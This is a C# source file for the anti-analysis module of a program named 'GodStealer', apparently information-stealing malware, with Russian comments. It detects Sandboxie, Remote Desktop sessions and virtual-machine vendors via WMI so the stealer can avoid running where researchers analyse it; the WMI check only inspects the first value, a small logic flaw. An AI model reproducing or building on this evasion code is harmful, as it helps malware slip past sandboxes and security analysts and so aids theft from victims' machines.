using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace GodStealer.AntiVM
{
    class AntiVM
    {

        /// <summary>
        /// <b>Метод для проверки на запуск в среде RDP</b> (Remote Desktop Protocol)
        /// </summary>
        public static bool IsRdpAvailable => SystemInformation.TerminalServerSession == true;


        public static bool SandBoxies => Process.GetProcessesByName("SbieCtrl").Length > 0 && NativeMethods.GetModuleHandle("SbieDll.dll") != IntPtr.Zero;

        public static bool CheckWMI()
        {
            var VirtualNames = new List<string>
            {
                "virtual", "vmbox", "vmware", "virtualbox", "box",
                "thinapp", "VMXh", "innotek gmbh", "tpvcgateway",
                "tpautoconnsvc", "vbox", "kvm", "red hat","vmware, inc.", "vmware7,1"
            };
            List<string> list = GetModelsAndManufactures();
            foreach (string spisok in list)
            {
                return VirtualNames.Contains(spisok); // true
            }
            return false;
        }

        /// <summary>
        /// <b>Метод для получения информации о Производителе и Модели машины на системе пользователя.</b>
        /// </summary>
        /// <returns>Возращает Модель и Производителя компьютера.</returns>
        private static List<string> GetModelsAndManufactures()
        {
            var ModMan = new List<string>();
            try
            {
                var searcher = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_ComputerSystem");
                var items = searcher.Get().OfType<ManagementObject>().Where(p => p != null).FirstOrDefault();
                ModMan.Add(items["Manufacturer"]?.ToString().ToLower());
                ModMan.Add(items["Model"]?.ToString().ToLower());
            }
            catch { }
            return ModMan;
        }

        /// <summary>
        /// <b>Инициализатор проверки всех методов на наличие запуска в среде VMware</b> (Virtual Machine)
        /// </summary>
        /// <returns></returns>
        public static bool Inizialize() => SandBoxies || IsRdpAvailable || CheckWMI();
    }
    internal static class NativeMethods
    {
        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode)]
        internal static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}